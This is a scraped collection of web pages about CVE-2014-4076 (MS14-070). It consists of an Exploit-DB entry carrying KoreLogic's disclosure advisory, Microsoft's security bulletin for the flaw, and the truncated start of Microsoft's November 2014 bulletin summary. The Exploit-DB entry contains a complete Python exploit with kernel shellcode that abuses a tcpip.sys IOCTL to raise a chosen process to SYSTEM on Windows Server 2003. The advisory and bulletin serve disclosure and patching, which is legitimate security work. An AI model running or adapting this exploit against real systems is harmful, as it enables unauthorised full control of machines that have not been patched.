=== Content from www.exploit-db.com_e7f1c222_20250124_121442.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Microsoft Windows Server 2003 SP2 - Local Privilege Escalation (MS14-070)

#### EDB-ID:

###### 35936

#### CVE:

###### [2014-4076](https://nvd.nist.gov/vuln/detail/CVE-2014-4076)

---

**EDB Verified:**

#### Author:

###### [KoreLogic](/?author=7433)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [Windows](/?platform=windows)

#### Date:

###### 2015-01-29

---

**Vulnerable App:**

```
"""
KL-001-2015-001 : Microsoft Windows Server 2003 SP2 Arbitrary Write Privilege Escalation

Title: Microsoft Windows Server 2003 SP2 Arbitrary Write Privilege Escalation
Advisory ID: KL-001-2015-001
Publication Date: 2015.01.28
Publication URL: https://www.korelogic.com/Resources/Advisories/KL-001-2015-001.txt

1. Vulnerability Details

     Affected Vendor: Microsoft
     Affected Product: TCP/IP Protocol Driver
     Affected Version: 5.2.3790.4573
     Platform: Microsoft Windows Server 2003 Service Pack 2
     Architecture: x86, x64, Itanium
     Impact: Privilege Escalation
     Attack vector: IOCTL
     CVE-ID: CVE-2014-4076

2. Vulnerability Description

     The tcpip.sys driver fails to sufficiently validate memory
     objects used during the processing of a user-provided IOCTL.

3. Technical Description

     By crafting an input buffer that will be passed to the Tcp
     device through the NtDeviceIoControlFile() function, it
     is possible to trigger a vulnerability that would allow an
     attacker to elevate privileges.

     This vulnerability was discovered while fuzzing the tcpip.sys
     driver. A collection of IOCTLs that could be targeted was
     obtained and subsequently fuzzed. During this process, one of
     the crashes obtained originated from the IOCTL 0x00120028.
     This was performed on an x86 installation of Windows Server
     2003, Service Pack 2.

     ErrCode = 00000000
     eax=00000000 ebx=859ef888 ecx=00000008 edx=00000100 esi=00000000 edi=80a58270
     eip=f67ebbbd esp=f620a9c8 ebp=f620a9dc iopl=0         nv up ei pl zr na pe nc
     cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246
     tcpip!SetAddrOptions+0x1d:
     f67ebbbd 8b5e28          mov     ebx,dword ptr [esi+28h] ds:0023:00000028=????????

     A second chance exception has occurred during a mov
     instruction. This instruction is attempting to copy a pointer
     value from an un-allocated address space. Since no pointer
     can be found, an exception is generated.

     Let's begin by reviewing the call stack:

     kd> kv
     *** Stack trace for last set context - .thread/.cxr resets it
     ChildEBP RetAddr  Args to Child
     f620a9dc f67e416b f620aa34 00000022 00000004 tcpip!SetAddrOptions+0x1d (FPO: [Non-Fpo])
     f620aa10 f67e40de f620aa34 859ef888 859ef8a0 tcpip!TdiSetInformationEx+0x539 (FPO: [Non-Fpo])
     f620aa44 f67e3b24 85a733d0 85a73440 85a73440 tcpip!TCPSetInformationEx+0x8c (FPO: [Non-Fpo])
     f620aa60 f67e3b51 85a733d0 85a73440 85a733d0 tcpip!TCPDispatchDeviceControl+0x149 (FPO: [Non-Fpo])
     f620aa98 8081d7d3 85c4b410 85a733d0 85e82390 tcpip!TCPDispatch+0xf9 (FPO: [Non-Fpo])
     f620aaac 808ef85d 85a73440 85e82390 85a733d0 nt!IofCallDriver+0x45 (FPO: [Non-Fpo])
     f620aac0 808f05ff 85c4b410 85a733d0 85e82390 nt!IopSynchronousServiceTail+0x10b (FPO: [Non-Fpo])
     f620ab5c 808e912e 000006f4 00000000 00000000 nt!IopXxxControlFile+0x5e5 (FPO: [Non-Fpo])
     f620ab90 f55c10fa 000006f4 00000000 00000000 nt!NtDeviceIoControlFile+0x2a (FPO: [Non-Fpo])

     The nt!NtDeviceIoControlFile() function was called, creating
     a chain of subsequent function calls that eventually led to
     the tcpip!SetAddrOptions() function being called.

     By de-constructing the call to nt!NtDeviceIoControlFile() we
     can derive all required information to re-create this exception.

     0a b940dd34 80885614 nt!NtDeviceIoControlFile+0x2a
     eax=00000000 ebx=8c785070 ecx=00000000 edx=00000000 esi=00000000 edi=00000000
     eip=808e912e esp=b940dd08 ebp=b940dd34 iopl=0         nv up ei pl zr na pe nc
     cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246
     nt!NtDeviceIoControlFile+0x2a:
     808e912e 5d              pop     ebp
     kd> db [ebp+2C] L?0x4
     b940dd60  00 00 00 00                                      ....
     kd> db [ebp+28] L?0x4
     b940dd5c  00 00 00 00                                      ....
     kd> db [ebp+24] L?0x4
     b940dd58  20 00 00 00                                       ...
     kd> db [ebp+20] L?0x4
     b940dd54  00 11 00 00                                      ....
     kd> db [ebp+1c] L?0x4
     b940dd50  28 00 12 00                                      (...
     kd> db [ebp+18] L?0x4
     b940dd4c  58 4f bd 00                                      XO..
     kd> db [ebp+14] L?0x4
     b940dd48  00 00 00 00                                      ....
     kd> db [ebp+10] L?0x4
     b940dd44  00 00 00 00                                      ....
     kd> db [ebp+0c] L?0x4
     b940dd40  00 00 00 00                                      ....
     kd> db [ebp+8] L?0x4
     b940dd3c  b8 06 00 00                                      ....

     The inputBuffer for this call references memory at 0x1000 with
     a length of 0x20.

     kd> db 0x1100 L?0x20
     00001100  00 04 00 00 00 00 00 00-00 02 00 00 00 02 00 00  ................
     00001110  22 00 00 00 04 00 00 00-00 00 01 00 00 00 00 00  "...............

     After review of the tcpip.sys driver, some memory trickery
     was created to control the code flow until the instruction
     pointer could be controlled in a way that would be beneficial
     to an attacker.

     kd> db 0x28 L?0x11
     00000028  87 ff ff 38 00 00 00 00-00 00 00 00 00 00 00 00  ...8............
     00000038  01

     eax=00000000 ebx=80a58290 ecx=00000000 edx=00000000 esi=00000000 edi=00000000
     eip=0000002a esp=b940db3c ebp=b940db60 iopl=0         nv up ei pl zr na pe nc
     cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246
     0000002a ff              ???

     Since the instruction pointer now contains 0x0000002a,
     exploitation becomes trivial. Merely allocating the desired
     payload for execution at this memory address will allow for
     unprivileged users to run their payload within a privileged
     process.

4. Mitigation and Remediation Recommendation

     The vendor has issued a patch for this
     vulnerability, the details of which are presented
     in the vendor's public acknowledgment MS14-070
     (https://technet.microsoft.com/library/security/MS14-070).

5. Credit

     This vulnerability was discovered by Matt Bergin of KoreLogic
     Security, Inc.

6. Disclosure Timeline

     2014.04.28 - Initial contact; sent Microsoft report and PoC.
     2014.04.28 - Microsoft requests PoC.
     2014.04.29 - KoreLogic resends PoC from the initial contact
                  email.
     2014.04.29 - Microsoft acknowledges receipt of vulnerability
                  report.
     2014.04.29 - Microsoft opens case 19010 (MSRC 0050929) to
                  investigate the vulnerability.
     2014.04.30 - Microsoft informs KoreLogic that the case is
                  actively being investigated.
     2014.05.30 - Microsoft informs KoreLogic that the case is
                  actively being investigated.
     2014.06.11 - KoreLogic informs Microsoft that 30 business days
                  have passed since vendor acknowledgment of the
                  initial report. KoreLogic requests CVE number for
                  the vulnerability, if there is one. KoreLogic
                  also requests vendor's public identifier for the
                  vulnerability along with the expected disclosure
                  date.
     2014.06.24 - KoreLogic informs Microsoft that no response was
                  received following the 06.11.14 email. KoreLogic
                  requests CVE number for the vulnerability, if
                  there is one. KoreLogic also requests vendor's
                  public identifier for the vulnerability along with
                  the expected disclosure date.
     2014.06.24 - Microsoft replies to KoreLogic that they have
                  reproduced the vulnerability and are determining
                  how to proceed with the supplied information.
                  They are not able to provide a CVE or an expected
                  disclosure date.
     2014.07.02 - 45 business days have elapsed since Microsoft
                  acknowledged receipt of the vulnerability report
                  and PoC.
     2014.07.17 - KoreLogic requests CVE number for the
                  vulnerability. KoreLogic also requests vendor's
                  public identifier for the vulnerability along with
                  the expected disclosure date.
     2014.08.18 - Microsoft notifies KoreLogic that they have a CVE
                  but are not willing to share it with KoreLogic at
                  this time.
     2014.09.08 - KoreLogic requests CVE number for the
                  vulnerability. KoreLogic also requests vendor's
                  public identifier for the vulnerability along with
                  the expected disclosure date.
     2014.09.11 - Microsoft responds saying that the vulnerability
                  is expected to be disclosed in "a Fall release"
                  and that "it is currently looking good for
                  October." Does not provide CVE.
     2014.09.24 - Microsoft informs KoreLogic that there was a
                  packaging issue and that the patch will be pushed
                  to November.
     2014.11.03 - Microsoft confirms the patch will ship in November.
     2014.11.11 - Vulnerability publicly disclosed by Microsoft as
                  issue MS14-070 with CVE-2014-4076.
     2015.01.28 - KoreLogic releases advisory.

7. Exploit
"""

     #!/usr/bin/python2
     #
     # KL-001-2015-001 / MS14-070 / CVE-2014-4076
     # Microsoft Windows Server 2003 x86 Tcpip.sys Privilege Escalation
     # Matt Bergin @ KoreLogic / Level @ Smash the Stack
     # shout out to bla
     #

     from optparse import OptionParser
     from subprocess import Popen
     from os.path import exists
     from struct import pack
     from time import sleep
     from ctypes import *
     from sys import exit

     CreateFileA,NtAllocateVirtualMemory,WriteProcessMemory =
windll.kernel32.CreateFileA,windll.ntdll.NtAllocateVirtualMemory,windll.kernel32.WriteProcessMemory
     DeviceIoControlFile,CloseHandle = windll.ntdll.ZwDeviceIoControlFile,windll.kernel32.CloseHandle
     INVALID_HANDLE_VALUE,FILE_SHARE_READ,FILE_SHARE_WRITE,OPEN_EXISTING,NULL = -1,2,1,3,0

     def spawn_process(path):
         process = Popen([path],shell=True)
         pid = process.pid
         return

     def main():
         print "CVE-2014-4076 x86 exploit, Level\n"
         global pid, process
         parser = OptionParser()
         parser.add_option("--path",dest="path",help="path of process to start and elevate")
         parser.add_option("--pid",dest="pid",help="pid of running process to elevate")
         o,a = parser.parse_args()
         if (o.path == None and o.pid == None):
             print "[!] no path or pid set"
             exit(1)
         else:
             if (o.path != None):
           if (exists(o.path) != True):
         print "[!] path does not exist"
         exit(1)
           else:
                   Thread(target=spawn_process,args=(o.path),name='attacker-cmd').start()
             if (o.pid != None):
                 try:
                     pid = int(o.pid)
                 except:
                     print "[!] could not convert PID to an interger."
                     exit(1)
         while True:
                 if ("pid" not in globals()):
                     sleep(1)
                 else:
                     print "[+] caught attacker cmd at %s, elevating now" % (pid)
                     break
         buf =
"\x00\x04\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x22\x00\x00\x00\x04\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00"
         sc =
"\x60\x64\xA1\x24\x01\x00\x00\x8B\x40\x38\x50\xBB\x04\x00\x00\x00\x8B\x80\x98\x00\x00\x00\x2D\x98\x00\x00\x00\x39\x98\x94\x00\x00\x00\x75\xED\x8B\xB8\xD8\x00\x00\x00\x83\xE7\xF8\x58\xBB\x41\x41\x41\x41\x8B\x80\x98\x00\x00\x00\x2D\x98\x00\x00\x00\x39\x98\x94\x00\x00\x00\x75\xED\x89\xB8\xD8\x00\x00\x00\x61\xBA\x11\x11\x11\x11\xB9\x22\x22\x22\x22\xB8\x3B\x00\x00\x00\x8E\xE0\x0F\x35\x00"
         sc = sc.replace("\x41\x41\x41\x41",pack('<L',pid))
         sc = sc.replace("\x11\x11\x11\x11","\x39\xff\xa2\xba")
         sc = sc.replace("\x22\x22\x22\x22","\x00\x00\x00\x00")
         handle = CreateFileA("\\\\.\\Tcp",FILE_SHARE_WRITE|FILE_SHARE_READ,0,None,OPEN_EXISTING,0,None)
         if (handle == -1):
             print "[!] could not open handle into the Tcp device"
             exit(1)
         print "[+] allocating memory"
         ret_one = NtAllocateVirtualMemory(-1,byref(c_int(0x1000)),0x0,byref(c_int(0x4000)),0x1000|0x2000,0x40)
         if (ret_one != 0):
             print "[!] could not allocate memory..."
             exit(1)
         print "[+] writing relevant memory..."
         ret_two = WriteProcessMemory(-1, 0x28, "\x87\xff\xff\x38", 4, byref(c_int(0)))
         ret_three = WriteProcessMemory(-1, 0x38, "\x00"*2, 2, byref(c_int(0)))
         ret_four = WriteProcessMemory(-1, 0x1100, buf, len(buf), byref(c_int(0)))
         ret_five = WriteProcessMemory(-1, 0x2b, "\x00"*2, 2, byref(c_int(0)))
         ret_six = WriteProcessMemory(-1, 0x2000, sc, len(sc), byref(c_int(0)))
         print "[+] attack setup done, crane kick!"
         DeviceIoControlFile(handle,NULL,NULL,NULL,byref(c_ulong(8)),0x00120028,0x1100,len(buf),0x0,0x0)
         CloseHandle(handle)
         exit(0)

     if __name__=="__main__":
         main()

"""
The contents of this advisory are copyright(c) 2015
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
http://creativecommons.org/licenses/by-sa/4.0/

KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
https://www.korelogic.com/about-korelogic.html

Our public vulnerability disclosure policy is available at:
https://www.korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy.v1.0.txt
"""

```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from technet.microsoft.com_21cf48d9_20250126_010410.html ===

[Skip to main content](#main)

This browser is no longer supported.

Upgrade to Microsoft Edge to take advantage of the latest features, security updates, and technical support.

[Download Microsoft Edge](https://go.microsoft.com/fwlink/p/?LinkID=2092881 )
[More info about Internet Explorer and Microsoft Edge](https://learn.microsoft.com/en-us/lifecycle/faq/internet-explorer-microsoft-edge)

Table of contents

Exit focus mode

Read in English

Save

Table of contentsRead in English

Save

Add to plan
[Edit](https://github.com/MicrosoftDocs/security-updates/blob/live/security-updates/SecurityBulletins/2014/ms14-070.md "Edit This Document")

---

#### Share via

Facebook
x.com
LinkedIn
Email

---

Print

Table of contents

# Microsoft Security Bulletin MS14-070 - Important

* Article
* 03/01/2023
* 5 contributors

Feedback

## In this article

## Vulnerability in TCP/IP Could Allow Elevation of Privilege (2989935)

Published: November 11, 2014

**Version:** 1.0

## Executive Summary

This security update resolves a publically reported vulnerability in TCP/IP that occurs during input/output control ([IOCTL](https://technet.microsoft.com/library/security/dn848375.aspx)) processing.\*\*\*\*This vulnerability could allow elevation of privilege if an attacker logs on to a system and runs a specially crafted application. An attacker who successfully exploited this vulnerability could run arbitrary code in the context of another process. If this process runs with administrator privileges, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

This security update is rated Important for all supported editions of Windows Server 2003. For more information, see the **Affected Software** section.

The security update addresses the vulnerability by correcting how the Windows TCP/IP stack handles objects in memory during IOCTL processing. For more information about the vulnerabilities, see the **Frequently Asked Questions (FAQ)** subsection for the specific vulnerability.

For more information about this document, see [Microsoft Knowledge Base Article 2989935](https://support.microsoft.com/kb/2989935).

## Affected Software

The following software has been tested to determine which versions or editions are affected. Other versions or editions either are past their support life cycle or are not affected. To determine the support life cycle for your software version or edition, see [Microsoft Support Lifecycle](https://go.microsoft.com/fwlink/?linkid=21742).

| **Operating System** | **Maximum Security Impact** | **Aggregate Severity Rating** | **Updates Replaced** |
| --- | --- | --- | --- |
| **Windows Server 2003** |  |  |  |
| [Windows Server 2003 Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=ccb45a29-edd8-40ce-b71a-85ebbee91141) (2989935) | Elevation of Privilege | Important | 967723 in [MS09-048](https://go.microsoft.com/fwlink/?linkid=155978) |
| [Windows Server 2003 x64 Edition Service Pack 2](https://www.microsoft.com/download/details.aspx?familyid=521de792-862f-43cb-80ac-29b9b07008e8) (2989935) | Elevation of Privilege | Important | 967723 in [MS09-048](https://go.microsoft.com/fwlink/?linkid=155978) |
| [Windows Server 2003 with SP2 for Itanium-based Systems](https://www.microsoft.com/download/details.aspx?familyid=03e80c93-287f-4ec8-af0f-06013d1a561b) (2989935) | Elevation of Privilege | Important | 967723 in [MS09-048](https://go.microsoft.com/fwlink/?linkid=155978) |

## Severity Ratings and Vulnerability Identifiers

The following severity ratings assume the potential maximum impact of the vulnerability. For information regarding the likelihood, within 30 days of this security bulletin's release, of the exploitability of the vulnerability in relation to its severity rating and security impact, please see the Exploitability Index in the [November bulletin summary](https://technet.microsoft.com/library/security/ms14-nov).

| **Affected Software** | [**TCP/IP Elevation of Privilege Vulnerability - CVE-2014-4076**](https://www.cve.org/CVERecord?id=CVE-2014-4076) | **Aggregate Severity Rating** |
| --- | --- | --- |
| **Windows Server 2003** |  |  |
| Windows Server 2003 Service Pack 2 | **Important** \ Elevation of Privilege | **Important** |
| Windows Server 2003 x64 Edition Service Pack 2 | **Important** \ Elevation of Privilege | **Important** |
| Windows Server 2003 with SP2 for Itanium-based Systems | **Important** \ Elevation of Privilege | **Important** |

## TCP/IP Elevation of Privilege Vulnerability - CVE-2014-4076

An elevation of privilege vulnerability exists in the Windows TCP/IP stack (tcpip.sys, tcpip6.sys) that is caused when the Windows TCP/IP stack fails to properly handle objects in memory during IOCTL processing. This vulnerability has been publicly disclosed. When this security bulletin was issued,\*\*\*\*Microsoft had not received any information to indicate that this vulnerability had been publicly used to attack customers. The update addresses the vulnerability by modifying the way that the Windows TCP/IP stack handles objects in memory during IOCTL processing.

### Mitigating Factors

Microsoft has not identified any [mitigating factors](https://technet.microsoft.com/library/security/dn848375.aspx) for this vulnerability.

### Workarounds

Microsoft has not identified any [workarounds](https://technet.microsoft.com/library/security/dn848375.aspx) for this vulnerability.

### FAQ

**What is the component affected by this vulnerability?**
The component affected by this vulnerability is the TCP/IP stack (tcpip.sys and tcpip6.sys).

**What might an attacker use the vulnerability to do?**

An attacker who successfully exploited this vulnerability could run arbitrary code in the context of another process. If this process runs with administrator privileges, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

**How could an attacker exploit the vulnerability?**

To exploit this vulnerability, an attacker would first have to log on to the system. An attacker could then run a specially crafted application that could exploit the vulnerability and take complete control over the affected system.

**What systems are primarily at risk from the vulnerability?**

Networked Windows servers are affected by this vulnerability.

## Security Update Deployment

For Security Update Deployment information, see the Microsoft Knowledge Base article referenced in the Executive Summary.

## Acknowledgments

Microsoft recognizes the efforts of those in the security community who help us protect customers through coordinated vulnerability disclosure. See [Acknowledgments](https://technet.microsoft.com/library/security/dn820091.aspx) for more information.

## Disclaimer

The information provided in the Microsoft Knowledge Base is provided "as is" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.

## Revisions

* V1.0 (November 11, 2014): Bulletin published.

*Page generated 2015-01-14 11:47Z-08:00.*

---

## Additional resources

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025
## Additional resources

### In this article

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025



=== Content from technet.microsoft.com_b3592959_20250126_010412.html ===

[Skip to main content](#main)

This browser is no longer supported.

Upgrade to Microsoft Edge to take advantage of the latest features, security updates, and technical support.

[Download Microsoft Edge](https://go.microsoft.com/fwlink/p/?LinkID=2092881 )
[More info about Internet Explorer and Microsoft Edge](https://learn.microsoft.com/en-us/lifecycle/faq/internet-explorer-microsoft-edge)

Table of contents

Exit focus mode

Read in English

Save

Table of contentsRead in English

Save

Add to plan
[Edit](https://github.com/MicrosoftDocs/security-updates/blob/live/security-updates/SecurityBulletinSummaries/2014/ms14-nov.md "Edit This Document")

---

#### Share via

Facebook
x.com
LinkedIn
Email

---

Print

Table of contents

# Microsoft Security Bulletin Summary for November 2014

* Article
* 10/14/2022
* 4 contributors

Feedback

## In this article

Published: November 11, 2014 | Updated: December 18, 2014

**Version:** 2.1

This bulletin summary lists security bulletins released for November 2014.

With the release of the security bulletins for November 2014, this bulletin summary replaces the bulletin advance notification originally issued November 6, 2014. For more information about the bulletin advance notification service, see [Microsoft Security Bulletin Advance Notification](https://go.microsoft.com/fwlink/?linkid=217213).

For information about how to receive automatic notifications whenever Microsoft security bulletins are issued, visit [Microsoft Technical Security Notifications](https://go.microsoft.com/fwlink/?linkid=21163).

Microsoft also provides information to help customers prioritize monthly security updates with any non-security updates that are being released on the same day as the monthly security updates. Please see the section, **Other Information**.

## Executive Summaries

The following table summarizes the security bulletins for this month in order of severity.

For details on affected software, see the next section, **Affected Software**.

| **Bulletin ID** | **Bulletin Title and Executive Summary** | **Maximum Severity Rating and Vulnerability Impact** | **Restart Requirement** | **Affected Software** |
| --- | --- | --- | --- | --- |
